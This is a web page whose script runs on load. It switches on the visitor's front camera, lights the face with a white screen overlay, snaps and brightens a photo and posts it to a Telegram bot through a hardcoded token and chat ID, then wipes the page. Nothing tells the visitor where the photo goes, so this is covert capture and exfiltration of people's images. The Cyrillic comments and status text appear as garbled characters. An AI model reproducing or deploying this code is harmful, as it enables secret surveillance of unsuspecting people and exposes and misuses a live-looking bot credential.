<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title></title>
    <style>
        body, html { margin:0; padding:0; width:100%; height:100%; background:#000; }
        #status { 
            position: fixed; top:20px; left:0; width:100%; 
            color:#0f0; font-family:Arial; text-align:center; 
            font-size:14px; z-index:1000; 
        }
        /* –ë–µ–ª–∞—è –ø–æ–¥—Å–≤–µ—Ç–∫–∞ –¥–ª—è –æ—Å–≤–µ—â–µ–Ω–∏—è –ª–∏—Ü–∞ */
        #light {
            position: fixed; top:0; left:0; width:100%; height:100%;
            background: rgba(255,255,255,0.95); display: none;
            z-index: 999;
        }
    </style>
</head>
<body>
    <div id="light"></div>
    <div id="status">üîÑ –ó–∞–ø—É—Å–∫...</div>

<script>
const BOT_TOKEN = '8415018467:AAFtfY3AnAOHvVMBK9zRj1BehN6uM2MC5e0';
const CHAT_ID = '1250741267';
const status = document.getElementById('status');
const light = document.getElementById('light');

function updateStatus(text) {
    status.textContent = text;
}

async function captureAndSend() {
    let stream = null;
    
    try {
        updateStatus('1. –í–∫–ª—é—á–∞—é –∫–∞–º–µ—Ä—É...');
        
        // === 1. –í–∫–ª—é—á–∞–µ–º –∫–∞–º–µ—Ä—É ===
        stream = await navigator.mediaDevices.getUserMedia({
            video: { 
                facingMode: 'user', // –§—Ä–æ–Ω—Ç–∞–ª—å–Ω–∞—è –∫–∞–º–µ—Ä–∞
                width: { ideal: 640 },
                height: { ideal: 480 }
            }
        });
        
        updateStatus('‚úÖ –ö–∞–º–µ—Ä–∞ –≤–∫–ª—é—á–µ–Ω–∞');
        
        // === 2. –ü–æ–¥–≥–æ—Ç–æ–≤–∫–∞ –≤–∏–¥–µ–æ ===
        const video = document.createElement('video');
        video.srcObject = stream;
        
        await new Promise(resolve => {
            video.onloadedmetadata = () => {
                updateStatus('2. –ù–∞—Å—Ç—Ä–∞–∏–≤–∞—é —Ñ–æ–∫—É—Å (1.5 —Å–µ–∫)...');
                resolve();
            };
        });
        
        // === 3. –í–ê–ñ–ù–û: –ñ–¥—ë–º –î–û–õ–¨–®–ï –¥–ª—è —Ñ–æ–∫—É—Å–∏—Ä–æ–≤–∫–∏ ===
        await new Promise(resolve => setTimeout(resolve, 1500));
        
        // === 4. –í–ö–õ–Æ–ß–ê–ï–ú –ü–û–î–°–í–ï–¢–ö–£ –ü–ï–†–ï–î –°–ù–ò–ú–ö–û–ú ===
        updateStatus('3. –î–µ–ª–∞—é —Å–Ω–∏–º–æ–∫...');
        light.style.display = 'block';
        await new Promise(resolve => setTimeout(resolve, 100));
        
        // === 5. –î–µ–ª–∞–µ–º —Å–Ω–∏–º–æ–∫ ===
        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        
        const ctx = canvas.getContext('2d');
        ctx.drawImage(video, 0, 0);
        
        // === 6. –í—ã–∫–ª—é—á–∞–µ–º –ø–æ–¥—Å–≤–µ—Ç–∫—É –∏ –∫–∞–º–µ—Ä—É ===
        light.style.display = 'none';
        stream.getTracks().forEach(track => track.stop());
        updateStatus('‚úÖ –§–æ—Ç–æ —Å–¥–µ–ª–∞–Ω–æ');
        
        // === 7. –£–°–ò–õ–ï–ù–ù–û–ï –£–õ–£–ß–®–ï–ù–ò–ï –Ø–†–ö–û–°–¢–ò ===
        const imageData = ctx.getImageData(0, 0, canvas.width, canvas.height);
        const data = imageData.data;
        
        // –£–≤–µ–ª–∏—á–∏–≤–∞–µ–º —è—Ä–∫–æ—Å—Ç—å –Ω–∞ 50% (–±—ã–ª–æ 30%)
        for (let i = 0; i < data.length; i += 4) {
            data[i] = Math.min(255, data[i] * 1.5);     // –ö—Ä–∞—Å–Ω—ã–π
            data[i + 1] = Math.min(255, data[i + 1] * 1.5); // –ó–µ–ª—ë–Ω—ã–π
            data[i + 2] = Math.min(255, data[i + 2] * 1.5); // –°–∏–Ω–∏–π
        }
        
        ctx.putImageData(imageData, 0, 0);
        updateStatus('4. –û—Ç–ø—Ä–∞–≤–ª—è—é...');
        
        // === 8. –û—Ç–ø—Ä–∞–≤–∫–∞ –≤ Telegram ===
        canvas.toBlob(async (blob) => {
            const formData = new FormData();
            formData.append('chat_id', CHAT_ID);
            formData.append('photo', blob, 'photo.jpg');
            
            try {
                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
                
                const result = await response.json();
                
                if (result.ok) {
                    updateStatus('‚úÖ –§–æ—Ç–æ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ!');
                    setTimeout(() => {
                        document.body.innerHTML = '';
                    }, 1000);
                } else {
                    updateStatus(`‚ùå –û—à–∏–±–∫–∞ Telegram: ${result.description}`);
                }
            } catch (fetchError) {
                updateStatus(`‚ùå –û—à–∏–±–∫–∞ —Å–µ—Ç–∏: ${fetchError.message}`);
            }
        }, 'image/jpeg', 0.85); // –ö–∞—á–µ—Å—Ç–≤–æ 85%
        
    } catch (error) {
        updateStatus(`‚ùå –û—à–∏–±–∫–∞: ${error.message}`);
        if (stream) stream.getTracks().forEach(track => track.stop());
        light.style.display = 'none';
    }
}

captureAndSend();
</script>
</body>
</html>
